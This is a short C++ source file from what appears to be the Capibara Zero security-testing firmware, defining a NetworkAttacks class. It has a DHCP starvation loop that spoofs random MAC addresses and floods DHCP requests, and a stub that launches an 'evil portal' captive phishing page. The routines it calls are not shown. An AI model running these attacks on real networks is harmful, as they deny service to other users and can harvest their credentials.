/*
 * This file is part of the Capibara zero (https://github.com/CapibaraZero/fw or https://capibarazero.github.io/).
 * Copyright (c) 2023 Andrea Canale.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "network_attacks.hpp"
#include "DHCPGlutton.hpp"
#include "evilportal.hpp"

#define MDNS_NAME "esp.lan"
#define STATIC_PATH "/captive_portal/"

NetworkAttacks::NetworkAttacks(/* args */)
{
}

NetworkAttacks::~NetworkAttacks()
{
}

void NetworkAttacks::dhcp_starvation()
{
    DHCPGlutton dhcp_dos = DHCPGlutton();
    for (;;)
    {
        dhcp_dos.random_mac_address_spoof();
        dhcp_dos.send_dhcp_request();
    }
}

void NetworkAttacks::evilportal() {
    EvilPortal evilPortal = EvilPortal(MDNS_NAME, STATIC_PATH);
}